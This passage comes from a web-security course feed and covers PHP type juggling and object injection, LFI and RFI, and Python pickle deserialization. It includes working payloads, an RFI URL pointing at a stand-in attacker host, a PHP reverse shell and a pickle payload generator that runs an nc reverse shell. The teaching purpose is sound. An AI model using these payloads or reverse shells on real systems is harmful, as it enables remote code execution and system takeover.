&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$data&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#000">$adminName&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#000">$data&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#000">$adminPassword&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;You logged in as admin!&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span> &lt;span style="color:#204a87;font-weight:bold">else&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;Login failed!&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Payload: &lt;code>a:2:{s:8:&amp;quot;username&amp;quot;;b:1;s:8:&amp;quot;password&amp;quot;;b:1;}&lt;/code>&lt;/p>
&lt;h1 id="local-file-inclusion-lfi--remote-file-inclusion-rfi">Local File Inclusion (LFI) / Remote File Inclusion (RFI)&lt;/h1>
&lt;p>An attacker can use &lt;strong>Local File Inclusion (LFI)&lt;/strong> to trick the web application into exposing or running files on the web server.
An &lt;strong>LFI&lt;/strong> attack may lead to &lt;strong>Information Disclosure&lt;/strong>, &lt;strong>Remote Code Execution (RCE)&lt;/strong>, or even &lt;strong>Cross-site Scripting (XSS)&lt;/strong>.&lt;/p>
&lt;p>Typically, &lt;strong>LFI&lt;/strong> occurs when an application uses the path to a file as input.
If the application treats this input as trusted, a local file may be used in the include statement.&lt;/p>
&lt;p>Using &lt;strong>Remote File Inclusion (RFI)&lt;/strong>, an attacker can cause the web application to include a remote file.
This is possible for web applications that dynamically include external files or scripts.
Potential web security consequences of a successful &lt;strong>RFI&lt;/strong> attack range from &lt;strong>Sensitive Information Disclosure&lt;/strong> and &lt;strong>Cross-site Scripting (XSS)&lt;/strong> to &lt;strong>Remote Code Execution (RCE)&lt;/strong> and, as a final result, &lt;strong>full system compromise&lt;/strong>.&lt;/p>
&lt;p>&lt;strong>Remote file inclusion&lt;/strong> attacks usually occur when an application receives a path to a file as input for a web page and does not properly sanitize it.
This allows an external URL to be supplied to the include function.&lt;/p>
&lt;p>&lt;img src="./assets/what-is-rfi-attack.png" alt="RFI Attack">&lt;/p>
&lt;p>The above definitions are very similar, so what is the exact difference between the two of them and how does an exploit affect the web application in each case?&lt;/p>
&lt;h2 id="local-file-inclusion">Local File Inclusion&lt;/h2>
&lt;p>&lt;strong>Local File Inclusion&lt;/strong> can be divided into subcategories based on the end target of the attack.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>Path Traversal&lt;/strong> - which we have studied in a previous session.
It uses a local file path and enables the attacker to access the contents of arbitrary files.
The outcome of this attack is to read sensitive data and expose confidential information.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Remote Code Execution (RCE)&lt;/strong> - which is a &lt;strong>very dangerous vulnerability&lt;/strong>.
It could be present in web applications that offer the possibility of uploading arbitrary files without proper checks.
Once a malicious file was uploaded (such as a reverse shell), the attacker can compromise the entire system.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// Get the filename from a GET input
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#8f5902;font-style:italic">// Example - http://example.com/?file=filename.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#000">$file&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">$_GET&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// Unsafely include the file
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#8f5902;font-style:italic">// Example - filename.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#204a87;font-weight:bold">include&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;directory/&amp;#39;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span> &lt;span style="color:#000">$file&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Payload: &lt;code>http://example.com/?file=../../uploads/evil.php&lt;/code>&lt;/p>
&lt;h2 id="remote-file-inclusion">Remote File Inclusion&lt;/h2>
&lt;p>Exactly like in the case of &lt;strong>Local File Inclusion&lt;/strong>, where the attacker is able to upload a reverse shell on the server, the &lt;strong>Remote File Inclusion&lt;/strong> vulnerability lets the attacker include a remote file in the current web application and execute its contents.
This file could be a reverse shell and give the attacker &lt;strong>full system control&lt;/strong>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// Get the filename from a GET input
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#8f5902;font-style:italic">// Example - http://example.com/?file=index.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#000">$file&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">$_GET&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// Unsafely include the file
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#8f5902;font-style:italic">// Example - index.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#204a87;font-weight:bold">include&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$file&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Payload: &lt;code>http://example.com/?file=http://attacker.example.com/evil.php&lt;/code>&lt;/p>
&lt;p>&lt;strong>Note:&lt;/strong> Even though some web servers run as &lt;strong>root&lt;/strong> (&lt;strong>which is a very bad practice&lt;/strong>), most of them run as a special user (&lt;strong>www-data&lt;/strong>) which doesn’t have root privileges.
This means that getting a reverse shell on a web server will grant you only the rights of the user running the website.
In order to get root access on the machine, further &lt;strong>privilege escalation&lt;/strong> methods should be employed, which you will learn about in a future session.&lt;/p>
&lt;h3 id="example-of-a-simple-reverse-shell-in-php">Example of a simple reverse shell in PHP:&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$sock&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">fsockopen&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;127.0.0.1&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1234&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$proc&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">proc_open&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;/bin/sh -i&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#204a87;font-weight:bold">array&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&amp;gt;&lt;/span>&lt;span style="color:#000">$sock&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&amp;gt;&lt;/span>&lt;span style="color:#000">$sock&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">2&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&amp;gt;&lt;/span>&lt;span style="color:#000">$sock&lt;/span>&lt;span style="color:#000;font-weight:bold">),&lt;/span> &lt;span style="color:#000">$pipes&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="python-insecure-deserialization--pickle-module">Python Insecure Deserialization / &lt;code>pickle&lt;/code> module&lt;/h1>
&lt;p>We have looked at so many PHP vulnerabilities in this session, but you shouldn&amp;rsquo;t be left with the impression that PHP is the only vulnerable language.
In this section we will approach an insecure object deserialization in a Python web application.&lt;/p>
&lt;h2 id="python-pickle">Python &lt;code>pickle&lt;/code>&lt;/h2>
&lt;p>In Python, the &lt;code>pickle&lt;/code> module lets you serialize and deserialize data.
Essentially, this means that you can convert a Python object into a stream of bytes and then reconstruct it (including the object’s internal structure) later in a different process or environment by loading that stream of bytes.&lt;/p>
&lt;p>When consulting the Python docs for pickle one cannot miss the following warning:&lt;/p>
&lt;p>&lt;code>Warning: The pickle module is not secure. Only unpickle data you trust.&lt;/code>&lt;/p>
&lt;p>Let&amp;rsquo;s have a look at how &lt;code>pickle&lt;/code> handles your data. In Python you can serialize objects by using &lt;code>pickle.dumps()&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#000">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">pickle&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">dumps&lt;/span>&lt;span style="color:#000;font-weight:bold">([&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;pickle&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;me&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">2&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">3&lt;/span>&lt;span style="color:#000;font-weight:bold">])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The pickled representation we’re getting back from dumps will look like this:&lt;/p>
&lt;p>&lt;code>b'\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x06pickle\x94\x8c\x02me\x94K\x01K\x02K\x03e'&lt;/code>&lt;/p>
&lt;p>And now reading the serialized data back in&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#000">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">pickle&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">loads&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;&lt;/span>&lt;span style="color:#4e9a06">\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#4e9a06">]&lt;/span>&lt;span style="color:#4e9a06">\x94&lt;/span>&lt;span style="color:#4e9a06">(&lt;/span>&lt;span style="color:#4e9a06">\x8c\x06&lt;/span>&lt;span style="color:#4e9a06">pickle&lt;/span>&lt;span style="color:#4e9a06">\x94\x8c\x02&lt;/span>&lt;span style="color:#4e9a06">me&lt;/span>&lt;span style="color:#4e9a06">\x94&lt;/span>&lt;span style="color:#4e9a06">K&lt;/span>&lt;span style="color:#4e9a06">\x01&lt;/span>&lt;span style="color:#4e9a06">K&lt;/span>&lt;span style="color:#4e9a06">\x02&lt;/span>&lt;span style="color:#4e9a06">K&lt;/span>&lt;span style="color:#4e9a06">\x03&lt;/span>&lt;span style="color:#4e9a06">e.&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;will give us our list object back:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;pickle&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;me&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">2&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">3&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>What is actually happening behind the scenes is that the byte-stream created by dumps contains opcodes that are then one-by-one executed as soon as we load the pickle back in.&lt;/p>
&lt;p>Not every object can be serialized (e.g. file handles) and pickling and unpickling certain objects (like functions or classes) comes with restrictions.
The Python docs give you a good overview of what can and cannot be pickled.&lt;/p>
&lt;p>While in most cases you don’t need to do anything special to make an object &amp;ldquo;picklable&amp;rdquo;, pickle still allows you to define a custom behavior for the pickling process for your class instances.&lt;/p>
&lt;p>Reading a bit further down in the docs we can see that implementing &lt;code>__reduce__&lt;/code> is exactly what we would need to get code execution, when viewed from an attacker’s perspective:&lt;/p>
&lt;blockquote>
&lt;p>The &lt;code>__reduce__()&lt;/code> method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the &amp;ldquo;reduce value&amp;rdquo;). [&amp;hellip;]
When a tuple is returned, it must be between two and six items long.
Optional items can either be omitted, or &lt;code>None&lt;/code> can be provided as their value.
The semantics of each item are in order:&lt;/p>
&lt;ul>
&lt;li>A callable object that will be called to create the initial version of the object.&lt;/li>
&lt;li>A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. [&amp;hellip;]&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>So by implementing &lt;code>__reduce__&lt;/code> in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run.
While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.&lt;/p>
&lt;p>A sample payload generator which opens a reverse shell can be analyzed below:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#000">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#000">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#000">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">class&lt;/span> &lt;span style="color:#000">RCE&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">def&lt;/span> &lt;span style="color:#000">__reduce__&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#3465a4">self&lt;/span>&lt;span style="color:#000;font-weight:bold">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">cmd&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | &amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#39;/bin/sh -i 2&amp;gt;&amp;amp;1 | nc 127.0.0.1 1234 &amp;gt; /tmp/f&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#000">os&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">system&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">cmd&lt;/span>&lt;span style="color:#000;font-weight:bold">,)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000">__name__&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">pickled&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">pickle&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">dumps&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">RCE&lt;/span>&lt;span style="color:#000;font-weight:bold">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">base64&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">urlsafe_b64encode&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">pickled&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This code will generate a reverse shell, which opens the possibility of &lt;strong>RCE&lt;/strong> on the target machine.
In order to accomplish this, you also need to make sure the port is accessible to the Internet.
You may find some simple instructions for how to do this &lt;a href="https://securiumsolutions.com/blog/reverse-shell-using-tcp/">here&lt;/a>, using &lt;code>ngrok&lt;/code>.
Again, it&amp;rsquo;s one of the most dangerous vulnerabilities for a web application, whatever the programming language was chosen for the back-end (be it &lt;strong>PHP&lt;/strong>, &lt;strong>Python&lt;/strong>, &lt;strong>JavaScript&lt;/strong>, &lt;strong>Ruby&lt;/strong>, etc.), and the programmer should be aware and protect it against malicious actors.
Also, always research the functions and modules used inside your application to prevent such vulnerabilities.&lt;/p>
&lt;h1 id="wrap-up">Wrap Up&lt;/h1>
&lt;p>As you have seen so far, even a small mistake, such as using &lt;code>==&lt;/code> instead of &lt;code>===&lt;/code>, can cause your application to break at unexpected input.
From an attacker standpoint, you can never know if the programmer was careful enough when writing the code, so you should always research and test what exploits can the application be vulnerable to, specific to the language / framework used.&lt;/p>
&lt;p>The most important aspect we kept talking about during all the sessions is to never trust the user input.
He can have malicious thoughts and purposefully try to break the application or he can unknowingly send a bad request and achieve the same result.
In conclusion, the code should be properly tested before being put in production and the user input should always be carefully sanitized.&lt;/p>
&lt;h1 id="further-reading">Further Reading&lt;/h1>
&lt;ul>
&lt;li>&lt;a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/">https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/">https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/">https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09">https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/">https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/">https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/">https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/">https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.whitehatsec.com/blog/magic-hashes/">https://www.whitehatsec.com/blog/magic-hashes/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/">https://davidhamann.de/2020/04/05/exploiting-python-pickle/&lt;/a>&lt;/li>
&lt;/ul>
&lt;h1 id="activities">Activities&lt;/h1>
&lt;ul>
&lt;li>&lt;a href="https://sss-web.cyberedu.ro/challenge/5eb0b460-0849-11ed-bb4d-935fa24b7bf2">Breaking Hashes&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sss-web.cyberedu.ro/challenge/9f845f10-0849-11ed-8fc0-2d7dcc866b21">Defaced Website&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sss-web.cyberedu.ro/challenge/bb9ee7b0-0849-11ed-a68c-f70dace328dc">Handy Tool&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sss-web.cyberedu.ro/challenge/d3a9cb70-0849-11ed-8436-9bcd29625f3f">Jar of Pickles&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sss-web.cyberedu.ro/challenge/ee04f8d0-0849-11ed-851c-af7641b8a719">Meme Uploader&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sss-web.cyberedu.ro/challenge/06d17960-084a-11ed-95a0-a9f50e1b83e7">Pro Replacer&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sss-web.cyberedu.ro/challenge/1cb64670-084a-11ed-8430-29d0d2a909b5">TODO App&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Essentials:</title><link>/essentials/binary-analysis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/binary-analysis/</guid><description>
&lt;h1 id="binary-analysis">Binary Analysis&lt;/h1>
&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;p>Use &lt;a href="https://github.com/ekalinin/github-markdown-toc">gh-md-toc&lt;/a>.&lt;/p>
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>Objectives and rationale for the current session.&lt;/p>
&lt;h2 id="reminders-and-prerequisites">Reminders and Prerequisites&lt;/h2>
&lt;ul>
&lt;li>Information required for this section&lt;/li>
&lt;li>Commands / snippets that should be known, useful to copy-paste throughout the practical session&lt;/li>
&lt;/ul>
&lt;h2 id="content-sections">Content Sections:&lt;/h2>
&lt;ul>
&lt;li>Content split in sections, according to session specifics&lt;/li>
&lt;li>Demos will be part of the session presentation and will be referenced (snippets, images, links) in the content&lt;/li>
&lt;/ul>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;ul>
&lt;li>Sumamrizing session concepts&lt;/li>
&lt;li>Summarizing commands / snippets that are useful for tutorials, challenges (easy reference, copy-paste)&lt;/li>
&lt;/ul>
&lt;h2 id="activities">Activities&lt;/h2>
